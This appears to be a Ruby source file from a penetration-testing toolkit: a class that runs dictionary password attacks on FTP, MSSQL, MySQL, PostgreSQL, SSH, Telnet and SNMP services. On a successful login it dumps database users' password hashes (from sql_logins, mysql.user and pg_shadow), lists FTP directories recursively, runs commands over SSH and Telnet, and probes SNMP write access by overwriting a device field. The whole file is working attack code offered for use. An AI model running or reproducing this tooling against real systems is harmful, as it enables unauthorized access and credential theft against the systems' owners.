# This is our Service Scan & Brute Class
# I use it to run service specific NMAP scans to quickly identify hosts on network running target service
# Then can use dictionary attacks against host(s) using the login tools
# Used in combination you can knock out some low hanging fruit rather easily, add as you like....

include SNMP

# Telnet Class Monkey Patch
# Helps recognize returns better
# From StackOverflow :)
class Net::Telnet
    def print(string)
      string = string.gsub(/#{IAC}/no, IAC + IAC) if @options["Telnetmode"]
      if @options["Binmode"]
        self.write(string)
      else
        if @telnet_option["BINARY"] and @telnet_option["SGA"]
          self.write(string.gsub(/\n/n, CR))
        elsif @telnet_option["SGA"]
          self.write(string.gsub(/\n/n, EOL)) ### fix here. reaplce CR+NULL bY EOL
        else
          self.write(string.gsub(/\n/n, EOL))
        end
      end
    end
end

# Service Scan & Brute
# NMAP Actually handles the Scanning
# This class handles protocol login checks/attacks
class SSB
  def initialize
    @@ports = { 'FTP' => 21, 'MSSQL' => 1433, 'MYSQL' => 3306, 'PGSQL' => 5432, 'SNMP' => 161, 'SMB' => 139, 'SSH' => 22, 'TELNET' => 23 } # 'WINRM' => 5985, 'RDP' => 3389
    @@tmp = RESULTS + 'tmp/'
    @@outdir = RESULTS + 'credentials/'
    Dir.mkdir(@@tmp) unless File.exists?(@@tmp) and File.directory?(@@tmp)
    Dir.mkdir(@@outdir) unless File.exists?(@@outdir) and File.directory?(@@outdir)
  end

  # Change default Service Ports
  def set_service_port(service, port)
    if @@ports.keys.include?(service.upcase)
      @@ports["#{service.upcase}"] = port.to_i
    else
      print_error("#{service.upcase} Service NOT Recognized!")
      print_error("NO Changes made to port settings....")
      return false
    end
  end

  # Service Login Checker/Attacker
  def slow_brute(service='MYSQL', host='127.0.0.1', user='root', passwords=['P@ssw0rd1'])
    if @@ports.keys.include?(service.upcase)
      if service == 'telnet'
        FileUtils.mkdir(@@tmp) unless File.exists?(@@tmp)
        FileUtils.rm_f(Dir.glob("#{@@tmp}/#{host}_telnet_log*"))
        olog="#{@@tmp}/#{host}_telnet_log.txt"
      end
      results={}
      pad = ' ' * 15
      total=passwords.size
      print_status("Loaded #{passwords.size} passwords for testing....")
      while passwords.size > 0
        pass=passwords.pop
        begin
          if service == 'ftp'
            ftp = Net::FTP.new(host)
            ftp.passive = true
            ftp.login("#{user}", "#{pass.chomp}")
            results.store(ftp, pass.chomp)
          elsif service == 'mssql'
            db = TinyTds::Client.new(:username => user, :password => pass.chomp, :host => host, :port => @@ports['MSSQL'].to_i)
            if db.active?
              results.store(db, pass.chomp)
            end
          elsif service == 'mysql'
            db = Mysql.connect(host, user, pass.chomp, db=nil, @@ports['MYSQL'].to_i)
            results.store(db, pass.chomp)
          elsif service == 'pgsql'
            client = PG::Connection.new(:host => host, :port => @@ports['PGSQL'].to_i, :user => user, :password => pass.chomp)
            results.store(client, pass.chomp)
          elsif service == 'ssh'
            session = Net::SSH.start( "#{host}", "#{user}", :password => "#{pass.chomp}", :port => @@ports['SSH'].to_i )
            results.store(session, pass.chomp)
          elsif service == 'telnet'
            telnet = Net::Telnet::new( "Host" => "#{host}", "Port" => @@ports['TELNET'].to_i, "Output_log" => "#{olog}", "Timeout" => 10 )
            telnet.login("#{user}", "#{pass.chomp}")
            telnet.close
            results.store(user, pass.chomp)
          end
          break if results.length > 0 # Stop on first success
        rescue Mysql::Error
          print "\r(#{(((total.to_f - passwords.size.to_f) / total.to_f) * 100).to_i}%)> #{pass.chomp}".white + pad
        rescue Net::FTPPermError
          print "\r(#{(((total.to_f - passwords.size.to_f) / total.to_f) * 100).to_i}%)> #{pass.chomp}".white + pad
        rescue Net::SSH::AuthenticationFailed => e
          print "\r(#{(((total.to_f - passwords.size.to_f) / total.to_f) * 100).to_i}%)> #{pass.chomp}".white + pad
        rescue Net::SSH::Disconnect
          print_error("Host Refusing Remote Login!")
          break
        rescue PG::Error => e
          print "\r(#{(((total.to_f - passwords.size.to_f) / total.to_f) * 100).to_i}%)> #{pass.chomp}".white + pad
        rescue Timeout::Error
          telnet.close
          f=File.open(olog, 'rb').readlines
          f.each do |line|
            if line =~ /[$%#>]/i
              results.store(user, pass.chomp)
            end
          end
          break if results.length > 0 # Stop on first success
          print "\r(#{(((total.to_f - passwords.size.to_f) / total.to_f) * 100).to_i}%)> #{pass.chomp}".white + pad
        rescue TinyTds::Error
          print "\r(#{(((total.to_f - passwords.size.to_f) / total.to_f) * 100).to_i}%)> #{pass.chomp}".white + pad
        rescue Errno::EHOSTUNREACH
          print_error("Connection Refused!")
          print_error("Hit CNTRL+C to abort!")
        rescue Errno::ECONNREFUSED
          print_error("Connection Refused!")
          print_error("Hit CNTRL+C to abort!")
        end
      end
      if results.length > 0
        puts "\n\n"
        print_good("w00t - Login Success!")
        f=File.open(@@outdir + 'success.txt', 'a+')
        f.puts "Host: #{host}:#{@@ports['#{service.upcase}']}"
        f.puts "Service: #{service.upcase}"
        f.puts "User: #{user}" unless service == 'snmp'
        print_good("Host: #{host}:#{@@ports['#{service.upcase}']}")
        print_good("Service: #{service.upcase}")
        print_good("User: #{user}") unless service == 'snmp'
        results.each { |k, v| puts "Pass".light_green + ": #{v.chomp}".white; f.puts "Pass: #{v.chomp}"; pass=v.chomp; }
        f.puts
        f.close
        if service == 'ftp'
          ftp_listing(results.keys.first, host)
        elsif service == 'mssql'
          mssql_hashdump(results.keys.first, host, user, pass)
        elsif service == 'mysql'
          mysql_hashdump(results.keys.first, host)
        elsif service == 'pgsql'
          pg_infodump(results.keys.first, host, user, pass)
        elsif service == 'ssh'
          ssh_info_check(results.keys.first, host, user, pass)
        elsif service == 'telnet'
          telnet_cmd_chk(host, user, pass)
        end
        puts
      else
        puts "\n"
        print_error("Host: #{host}\nUnable to Authenticate using provided wordlist...\n")
      end
    else
      puts
      print_error("Sorry, but #{service} is NOT a Supported Protocol!")
      print_error("Check your spelling and try again....")
    end
  end

  # Anonymous FTP Check
  def ftp_anon_check(host)
    passdump=@@outdir + host + '-ftp_dump.txt'
    f=File.open(passdump, 'w+')
    begin
      ftp = Net::FTP.new(host)
      ftp.passive = true
      ftp.login(user = "anonymous", passwd = nil, acct = nil)
      f.puts "Anonymous FTP Login: #{host}:#{@@ports['FTP'].to_i}"
      print_good("Anonymous FTP Login: #{host}:#{@@ports['FTP'].to_i}")
      f.close

      # Dump a Recursive Directory Listing
      ftp_listing(ftp, host)
      return true
    rescue Net::FTPPermError => e
      print_error("Unable to Login Anonymously to FTP for host: #{host}:#{@@ports['FTP'].to_i}")
      puts "\t=> ".white + "#{e}".light_red
      return false
    end
  end

  # Pass FTP Connection Object
  # List Content of Remote Directory
  def ftp_listing(ftp, host)
    passdump=@@outdir + host + '-ftp_dump.txt'
    f=File.open(passdump, 'a+')
    welcome_msg = ftp.last_response
    pwd = ftp.pwd
    @base = pwd
    sys = ftp.system
    content = ftp.list(pwd)
    f.puts "BANNER: \n#{welcome_msg.chomp}"
    f.puts "SYS: #{sys.chomp}"
    f.puts "PWD: #{pwd.chomp}"
    f.close
    print_good("BANNER:\n#{welcome_msg.chomp}")
    print_good("SYS: #{sys.chomp}")
    print_good("PWD: #{pwd.chomp}")
    ftp_scan(ftp, ftp.pwd, host)
    ftp.close
    puts
  end

  # FTP Content
  # Recursive Listing
  def ftp_scan(ftp, dir, host)
    passdump=@@outdir + host + '-ftp_dump.txt'
    f=File.open(passdump, 'a+')
    ftp.chdir(dir)
    f.puts "Listing Content for: #{ftp.pwd}"
    print_status("Listing Content for: #{ftp.pwd}")
    entries = ftp.list('*')
    entries.each do |file| 
      print_line("#{file.chomp}") unless file.chomp.nil? or file.chomp == '' 
      f.puts file.chomp unless file.chomp.nil? or file.chomp == ''
    end
    f.close
    entries.each do |entry|
      if entry[0] == "d" and entry.split(' ')[-1] != '.' and entry.split(' ')[-1] != '..'
        ftp_scan(ftp, entry.chomp, host) #Call self until no more dirs left
      end
    end
    # Since we dipped down a level to scan this directory, lets go back to the parent so we can scan the next directory.
    ftp.chdir(@base)
  end

  # Pass a valid DB Connect Object for privileged user
  # Dumps the MS-SQL User & Password Hashes
  def mssql_hashdump(db, host, user, pass)
    print_status("Dumping MS-SQL User & Password Hashes....")
    begin
      passdump=@@outdir + host + '-mssql_dump.txt'
      f=File.open(passdump, 'w+')
      f.puts "MS-SQL User & Password Hashes"
      f.puts "Host: #{host}"
      res = db.execute('SELECT host_name()')
      res.each do |row|
        row.each do |k, v|
          f.puts "Hostname: #{v}"
          print_good("Hostname: #{v}")
        end
      end
      res = db.execute("SELECT is_srvrolemember('sysadmin', '#{user}');")
      res.each do |row|
        row.each do |k, v|
          if v.to_s =~ /1/
            @dba='Yes'
          else
            @dba='No'
          end
          f.puts "Is DBA: #{@dba}"
          print_good("Is DBA: #{@dba}")
        end
      end
      res = db.execute('SELECT @@version')
      res.each do |row|
        row.each do |k, v|
          f.puts "SQL Server Version:\n#{v}"
          print_good("SQL Server Version: \n#{v}")
        end
      end
      if @dba[0] == 'Y'
        f.puts "MS-SQL Users & Password Hashes: "
        print_good("MS-SQL Users & Password Hashes: ")
#        res = @client.execute('SELECT name, password_hash FROM master.sys.sql_logins') #<= Returns result in hex format
        res = db.execute("SELECT name + ':::' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins")
        res.each do |row|
          row.each do |k, v|
            f.puts v
            print_line("#{v}")
          end
        end
      end
      f.close
    rescue TinyTds::Error => e
      print_error("Problem dumping users & hashes!")
      puts "\t=> ".white + "#{e}".light_red
      f.close if f
    end
  end

  # Pass a valid DB Connect Object for privileged user
  # Dumps the MySQL User & Password Hashes
  def mysql_hashdump(db, host)
    print_status("Dumping MySQL User & Password Hashes....")
    begin
      passdump=@@outdir + host + '-mysql_dump.txt'
      f=File.open(passdump, 'w+')
      f.puts "MySQL User & Password Hashes"
      f.puts "Host: #{host}"
      query = db.query("SELECT CONCAT('HOST: ',host,0x0a,'USER: ',user,0x0a,'PASS: ',password,0x0a) FROM mysql.user;")
      query.each { |x| puts "#{x[0]}".white; f.puts x[0]; }
      f.puts
      puts
      db.close
      f.close
    rescue Mysql::Error => e
      print_error("Problem dumping hashes!")
      puts "\t=>".white + " #{e}\n".light_red
    end
  end

  # Postgres Basic Info Dump
  def pg_infodump(client, host, user, pass)
    puts
    begin
      infodump=@@outdir + host + '-pgsql_dump.txt'
      f=File.open(infodump, 'w+')
      f.puts "Host: #{host}"
      f.puts "User: #{user}"
      f.puts "Pass: #{pass}"
      connected_db = client.db()
      f.puts "Connected DB: #{connected_db}"
      print_good("Connected DB: #{connected_db}")
      dbs=[]
      available_db = client.query("SELECT datname FROM pg_database;")
      available_db.each do |row|
        row.each do |column|
          dbs << column[1]
        end
      end
      f.puts "Available DB: #{dbs.join(',')}"
      print_good("Available DB: #{dbs.join(',')}")
      connected_user = client.user()
      version = client.query("SELECT version();")
      f.puts "Postgres Version: "
      print_good("Postgres Version: ")
      version.each do |row|
        row.each do |column|
          f.puts column[1]
          puts column[1].white
        end
      end
      puts
      f.puts
      privileges = client.query("SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user;")
      f.puts "User Privileges:"
      print_good("User Privileges: ")
      privileges.each do |row|
        row.each do |column, value|
          f.puts "  #{column}: #{value}"
          print_line("  #{column}: #{value}")
        end
        puts
        f.puts
      end
      dba_accounts = client.query("SELECT usename FROM pg_user WHERE usesuper IS TRUE;")
      f.puts "DBA User Accounts: "
      print_good("DBA User Accounts: ")
      dbas=[]
      dba_accounts.each do |row|
        row.each do |column|
          dbas << column[1]
          print_line("  #{column[1]}")
          f.puts "  #{column[1]}"
        end
      end
      puts
      f.puts
    rescue PG::Error => e
      print_error("Error dumping basic info!")
      f.puts "Error dumping basic info!"
      puts "\t=> ".white + "#{e}".light_red
    end
    if not dbas.empty? and dbas.include?(connected_user)
      begin
        f.puts "Postgres Users & Password Dump:"
        print_good("Postgres Users & Password Dump: ")
        passwords = client.query("SELECT usename, passwd FROM pg_shadow;")
        passwords.each do |row|
          row.each do |column, value|
            f.puts "  #{column}: #{value}"
            print_line("   #{column}: #{value}")
          end
          puts
          f.puts
        end
      rescue PG::Error => e
        f.puts "Error dumping Postgres Users & Password hashes!"
        print_error("Error dumping Postgres Users & Password hashes!")
        puts "\t=> ".white + "#{e}".light_red
      end
    else
      print_caution("User is not a full DBA, skipping password dump......")
      f.puts "User is not a full DBA, skipping password dump......"
    end
    f.close
  end

  # SNMP Service "Bruter"
  # Better results being broken out....
  def snmp_brute(target, passwords)
    while(true)
      count=0
      f=File.open(@@outdir + 'snmp-success.txt', 'a+')
      passwords.each do |cs|
        begin
          manager = SNMP::Manager.new(:Host => target, :Port => @@ports['SNMP'], :Community => cs.chomp)
          sys_time = manager.get_value("sysUpTime.0")
          manager.close if manager
          if count.to_i == 0
            f.puts "Host: #{target}:#{@@ports['SNMP']}"
            f.puts "Service: SNMP"
          end
          count = count.to_i +  1
          f.puts "Pass: #{cs.chomp}"
          print_good("Pass: #{cs.chomp}")

          # Dump Some Basic Info to further confirm
          @wite_access=false
          snmpdump=@@outdir + host + '-snmp_dump.txt'
          f=File.open(snmpdump, 'w+')
          f.puts "Host: #{host}"
          f.puts "Pass: #{cs.chomp}"
          snmp_write_check(target, cs.chomp)

          break # Bail out on success
        rescue SNMP::RequestTimeout => e
          print_error("Bad Pass: #{cs.chomp}")
        end
      end
      break
    end
    f.close
  end

  # Check/Confirm SNMP Write Access
  def snmp_write_check(target, string)
    begin
      manager = SNMP::Manager.new(:Host => target, :Port => @@ports['SNMP'], :Community => string)
      original = manager.get_value('SNMPv2-MIB::sysContact.0') # SNMP System Contact String Value
      varbind = VarBind.new('1.3.6.1.2.1.1.4.0', OctetString.new("SNMP_Stalker")) # Try to Write to Contact
      manager.set(varbind)
      new = manager.get_value('SNMPv2-MIB::sysContact.0')
      if new == "SNMP_Stalker"
        varbind = VarBind.new('1.3.6.1.2.1.1.4.0', OctetString.new(original)) # Put original back
        manager.set(varbind)
        @wite_access=true
      else
        @wite_access=false
      end
    rescue SNMP::RequestTimeout => e
      @wite_access=false
    rescue SNMP::BER::InvalidObjectId => e
      @wite_access=false
    rescue ArgumentError => e
      @wite_access=false
    end
    snmp_basic(manager)
  end

  # CEnumerate Some Basic Info
  def snmp_basic(manager)
    # Grab some basic info using OID values which should be fairly generic in nature
    target = "#{manager.config[:host]}:#{manager.config[:port]}"
    cstring = manager.config[:community]
    snmp_version = manager.config[:version]
    sys_name = manager.get_value("sysName.0")
    sys_descr = manager.get_value("sysDescr.0")
    sys_time = manager.get_value("sysUpTime.0")

    print_good("Target: #{target}")
    print_good("Community String: #{cstring}")
    print_good("Read Access: Enabled")
    print_good("Write Access: Enabled") if @wite_access
    print_good("Write Access: Disabled") unless @wite_access
    if snmp_version
      print_good("SNMP Version: #{snmp_version}")
    else
      print_error("Unable to determine SNMP Version in use?")
    end
    if sys_name
      print_good("System Name: #{sys_name}")
    else
      print_error("Unable to determine system name!")
    end
    if sys_descr
      print_good("System Description: \n#{sys_descr}")
    else
      print_error("Unable to find system description!")
    end
    if sys_time
      print_good("System Uptime: #{sys_time}")
    else
      print_error("Unable to find system uptime!")
    end
  end

  # Uasing valid session object to check some basic info
  # session.exec(hostname; id; uname -a; uptime)
  def ssh_info_check(session, host, user, pass)
    sshdump=@@outdir + host + '-ssh_dump.txt'
    Dir.mkdir(@@outdir + host) unless File.exists?(@@outdir + host) and File.directory?(@@outdir + host)
    f=File.open(sshdump, 'w+')
    f.puts "Host: #{host}"
    f.puts "User: #{user}"
    f.puts "Pass: #{pass}"
    hostname = session.exec!("hostname").chomp
    print_good("Hostname: #{hostname}") unless hostname.nil? or hostname == ''
    f.puts "Hostname: #{hostname}" unless hostname.nil? or hostname == ''
    id = session.exec!("id").chomp
    print_good("UserID:   #{id}") if id =~ /uid=\d+/
    f.puts "UserID: #{id}" if id =~ /uid=\d+/
    uname = session.exec!("uname -a").chomp
    print_good("Uname:    #{uname}") unless uname.nil? or uname == ''
    f.puts "Uname: #{uname}" unless uname.nil? or uname == ''
    uptime = session.exec!("uptime").chomp
    print_good("Uptime:  #{uptime}") unless uptime.nil? or uptime == ''
    f.puts "Uptime: #{uptime}" unless uptime.nil? or uptime == ''
    f.puts
    puts
    session.close
  end

  # Try to run a few commanmds via Telnet
  # It should confirm login (Tested against Windows)
  def telnet_cmd_chk(host, user, pass)
    sshdump=@@outdir + host + '-telnet_dump.txt'
    Dir.mkdir(@@outdir + host) unless File.exists?(@@outdir + host) and File.directory?(@@outdir + host)
    f=File.open(sshdump, 'w+')
    f.puts "Host: #{host}"
    f.puts "User: #{user}"
    f.puts "Pass: #{pass}"
    begin
      telnet = Net::Telnet::new( "Host" => "#{host}", "Port" => @port.to_i, "Timeout" => 10 )
      telnet.login("#{user}", "#{pass}")
    rescue Timeout::Error
      begin 
        telnet.cmd('dir') { |c| puts "#{c}".white; f.puts c; } # Try Windows Command First
      rescue Timeout::Error
        begin
          telnet.cmd('ls -lua') { |c| puts "#{c}".white; f.puts c; } # Fall back to Unix Command
        rescue Timeout::Error
        end
      end
    rescue Errno::EPIPE
    end
    f.puts
    telnet.close
    f.close
    puts
  end
end
